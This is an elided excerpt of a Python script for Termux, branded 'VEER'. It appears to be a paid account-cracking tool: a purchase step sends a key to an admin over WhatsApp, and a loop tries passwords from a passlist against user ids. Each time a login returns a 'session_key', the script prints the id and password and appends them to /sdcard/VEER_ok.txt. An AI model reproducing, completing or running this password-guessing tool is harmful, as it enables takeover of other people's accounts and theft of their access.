...
def qsbuy():
        ...
        try:
                ...
                if str("upppdate") in update:
                        ...
                        print(f" 15-Days Price : 50")

                        print(f" 1-Month Price : 100")

                        print(50*"-")

                        input("[Press Enter To Send Key To Admin]")

                        os.system(f"termux-open-url https://wa.me/+923239360424?text={bumper}")
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r[VEER] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[VEER-OK] '+roid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/VEER_ok.txt','a').write(roid+'|'+pas+'\n')
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/VEER_ok.txt')
...
if '/data/data/com.termux/files/home/VEER' in datar:
